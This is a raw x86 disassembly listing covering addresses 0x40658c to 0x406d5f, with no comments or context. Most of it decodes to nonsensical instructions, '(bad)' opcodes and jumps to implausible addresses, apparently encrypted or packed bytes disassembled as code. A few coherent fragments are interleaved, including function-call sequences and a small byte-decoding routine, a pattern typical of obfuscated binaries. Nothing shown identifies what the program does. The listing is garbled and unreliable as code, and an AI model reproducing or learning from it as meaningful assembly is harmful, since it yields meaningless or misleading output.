  40658c:	mov    eax,DWORD PTR [ebp-0x10]
  40658f:	jmp    0x4066bb
  406594:	dec    edx
  406595:	add    bh,BYTE PTR [ebx]
  406597:	cmp    DWORD PTR [ebx-0x43],0x6a
  40659b:	fnsave [eax]
  40659d:	xchg   ebx,eax
  40659e:	mov    al,0xc5
  4065a0:	test   DWORD PTR [edx-0x4],0x7c246af2
  4065a7:	jl     0x4065b6
  4065a9:	jg     0x406627
  4065ab:	jl     0x40654b
  4065ad:	push   ss
  4065ae:	mov    eax,ds:0x21f26b96
  4065b3:	scas   al,BYTE PTR es:[edi]
  4065b4:	lods   al,BYTE PTR ds:[esi]
  4065b5:	popa   
  4065b6:	mov    ch,0x7
  4065b8:	xchg   ebp,eax
  4065b9:	aad    0xa2
  4065bb:	push   0xffffff9c
  4065bd:	add    al,0x9a
  4065bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065c0:	lea    esp,[ecx]
  4065c2:	add    edi,DWORD PTR [esi]
  4065c4:	test   al,dl
  4065c6:	xchg   edx,eax
  4065c7:	cld    
  4065c8:	das    
  4065c9:	jae    0x40657a
  4065cb:	fs loope 0x40658e
  4065ce:	icebp  
  4065cf:	add    eax,0xa5f2c3fc
  4065d4:	nop
  4065d5:	xchg   esi,eax
  4065d6:	pop    ecx
  4065d7:	(bad)  [esi-0x50]
  4065da:	mov    eax,ds:0xee19ab40
  4065df:	mov    ah,BYTE PTR ss:[edx-0x7493dbb7]
  4065e6:	push   cs
  4065e7:	aaa    
  4065e8:	ror    DWORD PTR [edx+0x32e98ba5],cl
  4065ee:	out    0xdf,al
  4065f0:	cmp    edx,DWORD PTR [esi+0xbea62f9]
  4065f6:	test   bl,dl
  4065f8:	mov    ss,WORD PTR [edx]
  4065fa:	pop    esp
  4065fb:	imul   ebx,DWORD PTR [edx+0x14975de2],0x53
  406602:	cld    
  406603:	or     ebp,DWORD PTR [edi-0x68]
  406606:	popf   
  406607:	xchg   BYTE PTR [esi+0x439f44ca],bl
  40660d:	push   ecx
  40660e:	mov    ebp,0xb93bddab
  406613:	call   0xbc9a:0xf680dcb7
  40661a:	pop    esi
  40661b:	ds jns 0x406619
  40661e:	imul   edx,DWORD PTR [ebx+esi*2],0x28
  406622:	push   ebx
  406623:	adc    al,dh
  406625:	inc    esp
  406626:	mov    ds:0xe0afa718,al
  40662b:	sbb    al,0x84
  40662d:	lods   al,BYTE PTR ds:[esi]
  40662e:	popa   
  40662f:	popf   
  406630:	sahf   
  406631:	and    BYTE PTR [ecx+0x1437cc5],al
  406637:	imul   ecx,DWORD PTR [esi-0x23],0xffffff93
  40663b:	pop    ebp
  40663c:	sar    BYTE PTR [eax],cl
  40663e:	cld    
  40663f:	inc    ecx
  406640:	mov    bh,0xca
  406642:	(bad)  
  406643:	imul   ecx,eax,0x7458acf9
  406649:	retf   0xdebe
  40664c:	cmp    eax,0xe77865b8
  406651:	dec    esi
  406652:	pushf  
  406653:	je     0x406684
  406655:	adc    esi,DWORD PTR [edi+ecx*2-0x51]
  406659:	ja     0x4065f2
  40665b:	pop    ebp
  40665c:	dec    edx
  40665d:	dec    ebp
  40665e:	imul   ecx,ebp,0xad895604
  406664:	in     eax,0x79
  406666:	mov    edi,0xf99a1741
  40666b:	mov    ebx,0x6df4edb6
  406670:	xchg   edi,eax
  406671:	jne    0x40660b
  406673:	adc    BYTE PTR [ebx],dl
  406675:	sbb    DWORD PTR [edx],edi
  406677:	jmp    0x49598908
  40667c:	addr16 js 0x4066e2
  40667f:	sbb    edi,eax
  406681:	jno    0x4066fb
  406683:	popf   
  406684:	xor    al,0xe9
  406686:	aas    
  406687:	ror    DWORD PTR [edi],0x15
  40668a:	push   edi
  40668b:	ds into 
  40668d:	repnz or BYTE PTR [ebp-0x3b],ch
  406691:	jmp    0x1b07ce62
  406696:	je     0x4066e3
  406698:	aam    0xde
  40669a:	jl     0x56b49389
  4066a0:	pop    ds
  4066a1:	mov    ebp,0x4f04c28
  4066a6:	jbe    0x40667f
  4066a8:	dec    ecx
  4066a9:	jge    0x4066b4
  4066ab:	push   esi
  4066ac:	js     0x40663a
  4066ae:	dec    eax
  4066af:	jns    0x4066fc
  4066b1:	fimul  DWORD PTR [eax+0x5]
  4066b4:	nop
  4066b5:	sahf   
  4066b6:	in     eax,dx
  4066b7:	mov    bl,0x74
  4066b9:	and    DWORD PTR [eax*1+0xaa],edi
  4066c0:	push   eax
  4066c1:	jmp    0x4067ed
  4066c6:	sub    ecx,DWORD PTR [esi+ecx*8-0xc]
  4066ca:	jge    0x4066c2
  4066cc:	jge    0x406731
  4066ce:	fnstenv [edi-0x6699b590]
  4066d4:	ja     0x406668
  4066d6:	jnp    0x4066ff
  4066d8:	jl     0x406756
  4066da:	or     eax,0x57c7c7f
  4066df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066e0:	ja     0x406681
  4066e2:	push   esi
  4066e3:	xchg   ebx,eax
  4066e4:	push   ebp
  4066e5:	jp     0x406742
  4066e7:	mov    DWORD PTR [ebx+0x4f],esi
  4066ea:	sub    al,0x3a
  4066ec:	stos   BYTE PTR es:[edi],al
  4066ed:	pop    es
  4066ee:	call   0x4ac4eada
  4066f3:	ficomp WORD PTR [ebx+ebx*4]
  4066f6:	cmp    bh,BYTE PTR [ecx-0x77]
  4066f9:	shl    DWORD PTR [eax-0x64],cl
  4066fc:	scas   eax,DWORD PTR es:[edi]
  4066fd:	les    edx,FWORD PTR ds:0xb0c61031
  406703:	inc    ecx
  406704:	jbe    0x406764
  406706:	cli    
  406707:	sub    eax,DWORD PTR es:[eax+edi*1+0x44]
  40670c:	dec    eax
  40670d:	call   0x370a8a7c
  406712:	jmp    0x27355bc9
  406717:	cmp    eax,0xc138727d
  40671c:	xchg   ecx,eax
  40671d:	pop    ebx
  40671e:	into   
  40671f:	adc    DWORD PTR [edx+0x77967224],esi
  406725:	mov    ds:0xd963049e,eax
  40672a:	jl     0x406723
  40672c:	into   
  40672d:	or     eax,0x8f73bd2a
  406732:	js     0x406737
  406734:	push   esp
  406735:	or     eax,0xc2d62072
  40673a:	push   ebp
  40673b:	mov    ?,WORD PTR [edi]
  40673d:	dec    ebx
  40673e:	sub    dh,bh
  406740:	in     eax,dx
  406741:	int    0xe
  406743:	(bad)  
  406744:	leave  
  406745:	js     0x406729
  406747:	out    0x8f,al
  406749:	imul   BYTE PTR [ebp+0x79]
  40674c:	push   es
  40674d:	popf   
  40674e:	cmp    DWORD PTR [eax-0x4b],esi
  406751:	push   ds
  406752:	inc    esi
  406753:	xchg   ebx,eax
  406754:	mov    dl,0xb9
  406756:	dec    ebx
  406757:	dec    esp
  406758:	arpl   cx,cx
  40675a:	int3   
  40675b:	add    ch,BYTE PTR [edi-0x1d1262db]
  406761:	int3   
  406762:	arpl   bx,si
  406764:	mov    eax,0xff4701
  406769:	das    
  40676a:	or     ebp,DWORD PTR [ebx]
  40676c:	fisub  DWORD PTR [ecx]
  40676e:	xchg   ecx,eax
  40676f:	dec    edi
  406770:	sbb    ah,bl
  406772:	in     eax,0x4a
  406774:	xor    al,0xa0
  406776:	xchg   ebp,eax
  406777:	push   ecx
  406778:	adc    DWORD PTR [edx+0xb],edx
  40677b:	mov    edx,0x3c9efa34
  406780:	sub    eax,0xdd8431d9
  406785:	stos   DWORD PTR es:[edi],eax
  406786:	imul   edx,DWORD PTR [edi],0xffffffc0
  406789:	mov    esi,0xb4f6245e
  40678e:	sti    
  40678f:	xchg   BYTE PTR [esp+ecx*4],ah
  406792:	adc    al,al
  406794:	enter  0x71bd,0x99
  406798:	fwait
  406799:	loop   0x406738
  40679b:	or     eax,0x520f4e92
  4067a0:	sbb    DWORD PTR [ebp+edi*2+0xe],eax
  4067a4:	xlat   BYTE PTR ds:[ebx]
  4067a5:	mov    al,ds:0x4d06c893
  4067aa:	pop    ebx
  4067ab:	lods   eax,DWORD PTR ds:[esi]
  4067ac:	aad    0x6
  4067ae:	int    0x6a
  4067b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067b1:	xchg   esp,eax
  4067b2:	mov    BYTE PTR [ecx+0x4d],0x4f
  4067b6:	aad    0x89
  4067b8:	rcl    BYTE PTR [ebx+0x529160ce],1
  4067be:	dec    edi
  4067bf:	and    ecx,eax
  4067c1:	inc    ebx
  4067c2:	fcom   QWORD PTR [ecx+0x11]
  4067c5:	iret   
  4067c6:	pop    eax
  4067c7:	je     0x406797
  4067c9:	add    eax,esp
  4067cb:	ja     0x406763
  4067cd:	int3   
  4067ce:	(bad)  
  4067cf:	or     al,0x95
  4067d1:	(bad)  
  4067d4:	mov    bl,0xf
  4067d6:	inc    esp
  4067d7:	sar    BYTE PTR [ecx+0x7d],cl
  4067da:	std    
  4067db:	loope  0x4067f3
  4067dd:	out    0x4a,eax
  4067df:	test   eax,0xf529a395
  4067e4:	push   ecx
  4067e5:	xor    BYTE PTR [ebp-0x34],bh
  4067e8:	xchg   ebp,eax
  4067e9:	jb     0x406777
  4067eb:	dec    ecx
  4067ec:	out    0x8b,al
  4067ee:	inc    ebp
  4067ef:	lock mov eax,DWORD PTR [eax+0x198]
  4067f6:	jmp    0x406922
  4067fb:	shr    ecx,cl
  4067fd:	dec    esp
  4067fe:	pop    esi
  4067ff:	pop    edx
  406800:	jns    0x4067e7
  406802:	ins    DWORD PTR es:[edi],dx
  406803:	adc    eax,0x67a54fb4
  406808:	shr    BYTE PTR [ecx+0x15],0x8
  40680c:	cmp    DWORD PTR [esp+edi*2+0xd],edi
  406810:	jg     0x40688e
  406812:	jl     0x4067c5
  406814:	push   ds
  406815:	fwait
  406816:	mov    WORD PTR [esi-0x53],cs
  406819:	mov    edi,0x15035b21
  40681e:	ins    DWORD PTR es:[edi],dx
  40681f:	jecxz  0x406880
  406821:	je     0x40688d
  406823:	and    al,0xe4
  406825:	(bad)  [ebp+0x76]
  406828:	or     al,0xd6
  40682a:	mov    DWORD PTR [edi+0x34],ebx
  40682d:	add    ch,BYTE PTR [ebx]
  40682f:	pop    ds
  406830:	xor    BYTE PTR [edx+0x71],cl
  406833:	and    al,0xe7
  406835:	addr16 xchg esp,eax
  406837:	xor    eax,esp
  406839:	dec    ebp
  40683a:	push   eax
  40683b:	loop   0x406875
  40683d:	call   0x3da357f4
  406842:	addr16 ja 0x406809
  406845:	mov    eax,ds:0x66d844e2
  40684a:	sbb    ah,ah
  40684c:	fsubr  st,st(0)
  40684e:	push   edi
  40684f:	scas   eax,DWORD PTR es:[edi]
  406850:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  406852:	cmp    bl,bh
  406854:	mov    dl,0x6b
  406856:	pop    ss
  406857:	sbb    eax,0x6fff5fd8
  40685c:	shl    BYTE PTR [ebx+eiz*4+0x78],cl
  406860:	sub    bl,BYTE PTR [ecx]
  406862:	stc    
  406863:	clc    
  406864:	mov    cl,ah
  406866:	iret   
  406867:	lods   eax,DWORD PTR ds:[esi]
  406868:	add    ebp,esi
  40686a:	push   esp
  40686b:	push   edx
  40686c:	xchg   esp,eax
  40686d:	xor    esp,DWORD PTR [ebp+0x37e2467b]
  406873:	xor    eax,0xc5514f8b
  406878:	mov    bh,0x59
  40687a:	jnp    0x406869
  40687c:	js     0x40684d
  40687e:	lahf   
  40687f:	pop    ebx
  406880:	mov    BYTE PTR [esi+0x2c],dh
  406883:	mov    ebx,eax
  406885:	dec    ecx
  406886:	dec    ebp
  406887:	fstp   DWORD PTR [edi+ecx*8]
  40688a:	(bad)  
  40688b:	mov    esp,0x2eb26eff
  406890:	xor    al,0x6a
  406892:	push   esp
  406893:	ja     0x40681d
  406895:	mov    ds:0x582b6768,al
  40689a:	jmp    DWORD PTR [ecx-0x60cd2691]
  4068a0:	lahf   
  4068a1:	jg     0x406854
  4068a3:	cdq    
  4068a4:	cmp    eax,0x104ee37
  4068a9:	das    
  4068aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068ab:	dec    ebp
  4068ac:	mov    dl,0x44
  4068ae:	ror    BYTE PTR [eax+0x64],1
  4068b1:	jge    0x4068ca
  4068b3:	push   es
  4068b4:	jmp    0x36a9:0x523ecc75
  4068bb:	out    dx,eax
  4068bc:	jb     0x4068a9
  4068be:	xchg   DWORD PTR [ebp-0x7231c05d],edx
  4068c4:	push   cs
  4068c5:	push   0x484c495e
  4068ca:	sub    al,0x64
  4068cc:	inc    ecx
  4068cd:	adc    al,0x56
  4068d0:	jle    0x406928
  4068d2:	and    DWORD PTR [edx],esp
  4068d4:	xlat   BYTE PTR ds:[ebx]
  4068d5:	out    0x37,eax
  4068d7:	sbb    esp,DWORD PTR [ebx-0x68]
  4068da:	adc    al,0x70
  4068dc:	or     cl,BYTE PTR [esi-0x12]
  4068df:	stos   BYTE PTR es:[edi],al
  4068e0:	clc    
  4068e1:	xchg   ebx,eax
  4068e2:	test   eax,0x1960c200
  4068e7:	mov    al,ds:0x78af260
  4068ec:	sti    
  4068ed:	imul   edx,DWORD PTR [esp+edi*2+0x15],0xffffffaa
  4068f2:	rcr    BYTE PTR [eax+0x2e],0xf8
  4068f6:	sub    eax,esp
  4068f8:	xor    DWORD PTR [ecx],ebx
  4068fa:	pop    ebx
  4068fb:	call   0xa01d0b96
  406900:	cmc    
  406901:	rol    DWORD PTR [eax+0x5304e7fe],cl
  406907:	std    
  406908:	loopne 0x406898
  40690a:	jmp    0x40692d
  40690c:	std    
  40690d:	jae    0x4068a2
  40690f:	or     cl,BYTE PTR [edx]
  406911:	jbe    0x40692a
  406913:	es cmp ebx,DWORD PTR ds:[ecx]
  406917:	mov    DWORD PTR [ecx+ebx*8+0x7f6b830e],edx
  40691e:	lahf   
  40691f:	jbe    0x406948
  406921:	scas   eax,DWORD PTR es:[edi]
  406922:	push   DWORD PTR [eax]
  406924:	call   0x40101c
  406929:	mov    DWORD PTR [ebp-0x8],eax
  40692c:	cmp    DWORD PTR [ebp-0x8],0x0
  406930:	lea    eax,[ebp+0x4]
  406933:	mov    DWORD PTR [ebp-0x20],eax
  406936:	je     0x406fd6
  40693c:	lea    eax,[ebp-0x18]
  40693f:	push   eax
  406940:	mov    eax,DWORD PTR [ebp-0x2c]
  406943:	xor    eax,esi
  406945:	add    eax,edi
  406947:	push   eax
  406948:	mov    eax,DWORD PTR [ebp-0x1c]
  40694b:	xor    eax,esi
  40694d:	add    eax,edi
  40694f:	push   eax
  406950:	push   DWORD PTR [ebp-0x8]
  406953:	lea    eax,[ebp-0x78]
  406956:	push   eax
  406957:	push   DWORD PTR [ebp-0xc]
  40695a:	push   DWORD PTR [ebp-0x14]
  40695d:	call   0x4055ae
  406962:	test   eax,eax
  406964:	je     0x406abb
  40696a:	lea    eax,[ebp-0x78]
  40696d:	push   eax
  40696e:	mov    eax,DWORD PTR [ebp-0x14]
  406971:	xor    eax,esi
  406973:	add    eax,edi
  406975:	push   eax
  406976:	mov    eax,DWORD PTR [ebp-0x10]
  406979:	add    eax,0xee
  40697e:	push   eax
  40697f:	mov    eax,DWORD PTR [ebp-0x10]
  406982:	mov    eax,DWORD PTR [eax+0x198]
  406988:	push   DWORD PTR [eax]
  40698a:	jmp    0x406ab6
  40698f:	xor    BYTE PTR [ecx-0x12922c70],ch
  406995:	mov    bl,0xa9
  406997:	and    BYTE PTR [esi+eax*2-0x22],ch
  40699b:	mov    ds:0x19acf19d,eax
  4069a0:	cmp    BYTE PTR [esp+edi*2+0xd],bh
  4069a4:	jg     0x406a22
  4069a6:	jl     0x4069d5
  4069a8:	sahf   
  4069a9:	fild   WORD PTR [eax-0x9714673]
  4069af:	and    dl,dh
  4069b1:	(bad)  
  4069b2:	lea    ebx,[esi-0x6f]
  4069b5:	xor    edx,ebx
  4069b7:	ss in  eax,0xcb
  4069ba:	adc    al,0x49
  4069bc:	test   BYTE PTR [ebx-0x33],dl
  4069bf:	or     cl,0xdd
  4069c2:	idiv   DWORD PTR [ebx+0x292314a4]
  4069c8:	mov    BYTE PTR [eax+0x6d],cl
  4069cb:	sbb    al,0xc
  4069cd:	rol    DWORD PTR [ebx],0xa9
  4069d0:	das    
  4069d1:	ret    
  4069d2:	bound  ecx,QWORD PTR [esp+ebp*8-0x10]
  4069d6:	mov    eax,0xb4b37da9
  4069db:	jg     0x406a08
  4069dd:	jne    0x4069c6
  4069df:	cmp    cl,cl
  4069e1:	adc    DWORD PTR [eax-0x7],edx
  4069e4:	je     0x4069d8
  4069e6:	(bad)  
  4069e7:	(bad)  
  4069e8:	mov    dl,0xfc
  4069ea:	loopne 0x406996
  4069ec:	ret    
  4069ed:	jae    0x4069de
  4069ef:	mov    esp,ebp
  4069f1:	jbe    0x406a46
  4069f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069f4:	icebp  
  4069f5:	out    0xb5,al
  4069f7:	aas    
  4069f8:	inc    esp
  4069f9:	jl     0x406a72
  4069fb:	call   0x3e7c:0x168fc9c6
  406a02:	jmp    0xf4f:0xdfb3f45a
  406a09:	ret    0x46d5
  406a0c:	sbb    esi,DWORD PTR [ebp+0x73b9f8d1]
  406a12:	or     BYTE PTR [ebx-0x3f6fa5a1],bl
  406a18:	dec    esi
  406a19:	push   cs
  406a1a:	stc    
  406a1b:	add    al,0x6f
  406a1d:	adc    DWORD PTR [ecx],esp
  406a1f:	dec    esp
  406a20:	mov    WORD PTR [esi-0x33f876c1],ss
  406a26:	push   ss
  406a27:	gs shr dh,0xfc
  406a2b:	add    esi,esi
  406a2d:	ja     0x4069e9
  406a2f:	jnp    0x406a8f
  406a31:	jle    0x4069f1
  406a33:	mov    edi,0x13256bda
  406a38:	adc    cl,BYTE PTR [ebx+ebp*1]
  406a3b:	adc    DWORD PTR [ecx],ebx
  406a3d:	retf   0xf035
  406a40:	adc    BYTE PTR [esi+0xe],dh
  406a43:	in     al,0xcd
  406a45:	xor    eax,0xd688639b
  406a4a:	jge    0x406a06
  406a4c:	pop    ebp
  406a4d:	or     eax,0xc138479b
  406a52:	jle    0x406a46
  406a54:	iret   
  406a55:	int    0x83
  406a57:	adc    al,0xce
  406a59:	sub    eax,DWORD PTR [eax-0x49]
  406a5c:	or     edi,edi
  406a5e:	and    edi,DWORD PTR [ebp-0x1c]
  406a61:	push   edi
  406a62:	ret    0x6565
  406a65:	arpl   cx,cx
  406a67:	clc    
  406a68:	(bad)  
  406a6a:	inc    ebp
  406a6b:	lahf   
  406a6c:	outs   dx,BYTE PTR ds:[esi]
  406a6d:	sub    al,0x3b
  406a6f:	push   ds
  406a70:	(bad)  
  406a71:	test   DWORD PTR [eax],0x34544c21
  406a77:	pop    esp
  406a78:	mov    edx,0x3183c58e
  406a7d:	ja     0x406a26
  406a7f:	add    eax,0xebe092c1
  406a84:	(bad)  
  406a85:	cmp    bl,dh
  406a87:	repnz div dl
  406a8a:	or     DWORD PTR [edx+0x22],ebx
  406a8d:	enter  0xa9c8,0x85
  406a91:	xor    eax,0xef62cace
  406a96:	fld    QWORD PTR [eax+0x4d]
  406a99:	imul   ebp,DWORD PTR [ebp-0x8],0xc0649573
  406aa0:	out    dx,al
  406aa1:	push   ss
  406aa2:	jp     0x406a94
  406aa4:	push   ss
  406aa5:	xchg   ebp,eax
  406aa6:	or     DWORD PTR [edi-0x13a8c595],0x37
  406aad:	stc    
  406aae:	shl    DWORD PTR [ebx-0x1924a31e],0x72
  406ab5:	adc    eax,0xffa561e8
  406aba:	dec    DWORD PTR [ebx-0x31cc1bb3]
  406ac0:	mov    eax,0xffcd8d62
  406ac5:	sub    eax,ecx
  406ac7:	jmp    0x406bf3
  406acc:	or     al,0x53
  406ace:	and    al,0x43
  406ad0:	jnp    0x406b2d
  406ad2:	jnp    0x406b27
  406ad4:	gs ins DWORD PTR es:[edi],dx
  406ad6:	push   esp
  406ad7:	and    BYTE PTR [esi+0x1f],dh
  406ada:	and    BYTE PTR [ebx+0x7c7c3b16],bh
  406ae0:	or     eax,0xb7c7c7f
  406ae5:	pushf  
  406ae6:	or     dl,al
  406ae8:	jmp    0x406ab8
  406aea:	jb     0x406adf
  406aec:	outs   dx,BYTE PTR ds:[esi]
  406aed:	fimul  WORD PTR [ebp+0x5dacf9cf]
  406af3:	jne    0x406ada
  406af5:	pop    edx
  406af6:	jp     0x406a9c
  406af8:	test   DWORD PTR [ecx+0x22549556],esp
  406afe:	cmp    BYTE PTR [edx-0x3b296ddf],0xfd
  406b05:	cld    
  406b06:	sbb    dh,al
  406b08:	stos   DWORD PTR es:[edi],eax
  406b09:	je     0x406b1f
  406b0b:	xor    esi,ecx
  406b0d:	mov    cl,0x17
  406b0f:	mov    al,ds:0x9a262edd
  406b14:	stc    
  406b15:	xor    edi,ecx
  406b17:	cld    
  406b18:	test   al,0x53
  406b1a:	les    esp,FWORD PTR [ebx]
  406b1c:	lahf   
  406b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b1e:	sahf   
  406b1f:	sti    
  406b20:	jmp    0x406b54
  406b22:	pop    eax
  406b23:	sti    
  406b24:	mov    ds:0xc73435f7,al
  406b29:	aaa    
  406b2a:	mov    eax,0x31596ba6
  406b2f:	sti    
  406b30:	pop    esp
  406b31:	ins    DWORD PTR es:[edi],dx
  406b32:	cmp    DWORD PTR [esp+esi*4+0x6df23fc6],0x5e3cd50c
  406b3d:	fiadd  WORD PTR [esi+0x3cf777c5]
  406b43:	into   
  406b44:	mov    eax,0xd640ce5d
  406b49:	xor    al,0xcf
  406b4b:	data16 mov bh,0xb0
  406b4e:	cmc    
  406b4f:	cmp    dh,BYTE PTR [ebx+0x4e971c12]
  406b55:	xchg   esp,eax
  406b56:	inc    esi
  406b57:	jmp    0x406b86
  406b59:	xchg   esi,eax
  406b5a:	retf   0xa8f7
  406b5d:	pop    eax
  406b5e:	out    dx,al
  406b5f:	test   DWORD PTR [edx],eax
  406b61:	xor    eax,DWORD PTR [edx+ebx*2]
  406b64:	add    eax,0xecbc3ccf
  406b69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b6a:	ss cmp al,0xc4
  406b6d:	frstor [esi]
  406b6f:	jecxz  0x406b11
  406b71:	jne    0x406b62
  406b73:	sbb    BYTE PTR [edi+ebp*8],dl
  406b76:	xchg   edi,eax
  406b77:	in     al,dx
  406b78:	loop   0x406b48
  406b7a:	sub    ecx,edx
  406b7c:	cld    
  406b7d:	inc    ecx
  406b7e:	sbb    edx,DWORD PTR [ecx-0x19149f27]
  406b84:	aas    
  406b85:	add    DWORD PTR [edx+0x31],0xc4c201cc
  406b8c:	inc    ebx
  406b8d:	loopne 0x406b89
  406b8f:	sbb    DWORD PTR [edi],esp
  406b91:	lods   eax,DWORD PTR ds:[esi]
  406b92:	cmp    DWORD PTR [ebx],edi
  406b94:	adc    esp,DWORD PTR [edi]
  406b96:	cmc    
  406b97:	test   DWORD PTR [ebx+0x33c8e935],eax
  406b9d:	iret   
  406b9e:	cmp    dh,BYTE PTR [eax+0x715a83c0]
  406ba4:	sub    eax,0xebbf6b0c
  406ba9:	jnp    0x406bed
  406bab:	clc    
  406bac:	pop    ecx
  406bad:	xor    DWORD PTR [ebx-0xebabc4b],ecx
  406bb3:	in     eax,0x0
  406bb5:	scas   al,BYTE PTR es:[edi]
  406bb6:	push   0x70318553
  406bbb:	fistp  QWORD PTR [ecx-0x4085bcf4]
  406bc1:	xor    al,0x2d
  406bc3:	mov    cl,0x55
  406bc5:	mov    bl,0x72
  406bc7:	pop    es
  406bc8:	popa   
  406bc9:	push   0x42e45cc1
  406bce:	inc    ebx
  406bcf:	mov    ah,0x9a
  406bd1:	mov    bh,0xa1
  406bd3:	jb     0x406b94
  406bd5:	psraw  mm3,QWORD PTR [ecx-0x6131e6c6]
  406bdc:	xchg   esp,edx
  406bde:	inc    ebp
  406bdf:	jle    0x406bee
  406be1:	std    
  406be2:	ret    0xc7fe
  406be5:	fs dec esi
  406be7:	adc    eax,0xa2714bec
  406bec:	(bad)  
  406bed:	mov    al,0x78
  406bef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bf0:	or     BYTE PTR [ecx-0x3e],bl
  406bf3:	sub    eax,DWORD PTR [ebp-0x8]
  406bf6:	mov    ecx,DWORD PTR [ebp-0x30]
  406bf9:	add    ecx,eax
  406bfb:	jmp    0x406d27
  406c00:	xchg   ebp,eax
  406c01:	(bad)  
  406c02:	out    0x14,eax
  406c04:	std    
  406c05:	push   esp
  406c06:	gs popf 
  406c08:	repz mov al,ds:0xafe89e75
  406c0e:	mov    al,0x2d
  406c10:	daa    
  406c11:	cmp    bh,BYTE PTR [esp+edi*2+0xd]
  406c15:	jg     0x406c93
  406c17:	jl     0x406c38
  406c19:	sbb    esp,DWORD PTR [edi]
  406c1b:	pop    esp
  406c1c:	xor    esp,DWORD PTR [ecx]
  406c1e:	pop    es
  406c1f:	mov    ecx,0x1d6dadd
  406c24:	mov    ss,esi
  406c26:	pop    esp
  406c27:	(bad)  
  406c28:	jbe    0x406bff
  406c2a:	fisttp DWORD PTR [ebx]
  406c2c:	test   ecx,esi
  406c2e:	cdq    
  406c2f:	arpl   bp,sp
  406c31:	adc    bl,BYTE PTR [ecx-0x32]
  406c34:	hlt    
  406c35:	dec    di
  406c37:	imul   eax,DWORD PTR [eax-0x4c],0xfffffffd
  406c3b:	adc    esi,eax
  406c3d:	jge    0x406bec
  406c3f:	mov    edx,edi
  406c41:	or     ebx,ecx
  406c43:	xor    DWORD PTR [ecx],0x625c5a69
  406c49:	not    BYTE PTR [eax+0x37496d93]
  406c4f:	fs fs xchg edx,eax
  406c52:	std    
  406c53:	sub    al,0x4b
  406c55:	push   ebp
  406c56:	push   ebp
  406c57:	sbb    al,0x54
  406c59:	push   0xd0c71786
  406c5e:	int    0x19
  406c60:	jmp    0x46d9:0x30cfe7e6
  406c67:	jmp    FWORD PTR [edx+0x149925c6]
  406c6d:	adc    BYTE PTR [ecx+esi*8],bh
  406c70:	cmp    BYTE PTR [eax],0x10
  406c73:	loope  0x406c58
  406c75:	push   ebp
  406c76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c77:	mov    bh,0xe4
  406c79:	push   eax
  406c7a:	arpl   WORD PTR [edx+0x6a],bx
  406c7d:	fisttp QWORD PTR [esi+0x1e]
  406c80:	pop    ss
  406c81:	lods   al,BYTE PTR ds:[esi]
  406c82:	cmp    dh,BYTE PTR [edx+esi*8]
  406c85:	pavgb  mm1,QWORD PTR ds:0x3cf0e3dd
  406c8c:	or     edx,DWORD PTR [ecx+edi*2]
  406c8f:	mov    bl,0x57
  406c91:	sbb    eax,0x1428ba7
  406c96:	mov    bl,0xda
  406c98:	xchg   ecx,eax
  406c99:	sar    DWORD PTR ds:0xd6191082,1
  406c9f:	fld    TBYTE PTR [edx]
  406ca1:	sub    eax,0x7c21de5
  406ca6:	pop    eax
  406ca7:	and    esi,DWORD PTR [esi+ecx*4]
  406caa:	xor    BYTE PTR [esi+0x3f0ce451],dl
  406cb0:	push   ebx
  406cb1:	adc    al,0xea
  406cb3:	call   0x68a6:0xda159be0
  406cba:	fidiv  DWORD PTR [edx-0x5af4826c]
  406cc0:	ds fwait
  406cc2:	push   ss
  406cc3:	inc    edx
  406cc4:	add    ch,BYTE PTR [ecx-0xd]
  406cc7:	inc    esp
  406cc8:	jecxz  0x406d16
  406cca:	int3   
  406ccb:	sub    eax,0x3357dc97
  406cd0:	jmp    0xe6395064
  406cd5:	dec    ecx
  406cd6:	dec    esi
  406cd7:	ror    DWORD PTR [eax],0x93
  406cda:	out    dx,al
  406cdb:	(bad)  
  406cdc:	call   0x961d7de0
  406ce1:	dec    ebp
  406ce2:	aaa    
  406ce3:	sbb    ebx,DWORD PTR [edx]
  406ce5:	imul   edi,DWORD PTR [edi-0x44],0x3
  406ce9:	stos   BYTE PTR es:[edi],al
  406cea:	(bad)  
  406ceb:	and    BYTE PTR [ebx-0x2b],bh
  406cee:	nop
  406cef:	out    dx,al
  406cf0:	arpl   si,cx
  406cf2:	repnz xchg esp,eax
  406cf4:	push   ss
  406cf5:	xor    bh,BYTE PTR [esi+0x5a6052d2]
  406cfb:	mov    esi,DWORD PTR [esi+ebp*1+0x7b11219b]
  406d02:	push   esi
  406d03:	dec    esp
  406d04:	cmp    eax,0x617f7f6b
  406d09:	sbb    DWORD PTR [edx],esp
  406d0b:	ja     0x406d61
  406d0d:	seta   BYTE PTR [esi]
  406d10:	or     DWORD PTR [eax],esp
  406d12:	add    esp,DWORD PTR [esi+ebx*4]
  406d15:	mov    BYTE PTR [esi+0x54],dl
  406d18:	sub    DWORD PTR [edx+0x1cb7afc1],ecx
  406d1e:	pusha  
  406d1f:	xchg   esi,eax
  406d20:	repnz mov dh,0xc9
  406d23:	xchg   DWORD PTR [ebp-0x5e],edi
  406d26:	push   0xffffff8b
  406d28:	inc    ebp
  406d29:	clc    
  406d2a:	mov    DWORD PTR [eax+0x1],ecx
  406d2d:	mov    al,BYTE PTR [ebp-0x1]
  406d30:	mov    ecx,DWORD PTR [ebp-0x8]
  406d33:	xor    al,0x49
  406d35:	sub    al,0x35
  406d37:	mov    BYTE PTR [ecx],al
  406d39:	lea    eax,[ebp-0x8]
  406d3c:	inc    BYTE PTR [eax]
  406d3e:	inc    eax
  406d3f:	push   eax
  406d40:	pop    ecx
  406d41:	dec    ecx
  406d42:	xchg   ecx,edx
  406d44:	dec    BYTE PTR [edx]
  406d46:	push   DWORD PTR [ebp-0x10]
  406d49:	mov    eax,ds:0x44525c
  406d4e:	mov    eax,DWORD PTR [eax]
  406d50:	push   DWORD PTR [eax]
  406d52:	lea    eax,ds:0x445278
  406d58:	jmp    0x406e84
  406d5d:	scas   eax,DWORD PTR es:[edi]
  406d5e:	stos   DWORD PTR es:[edi],eax
  406d5f:	fs pop ds
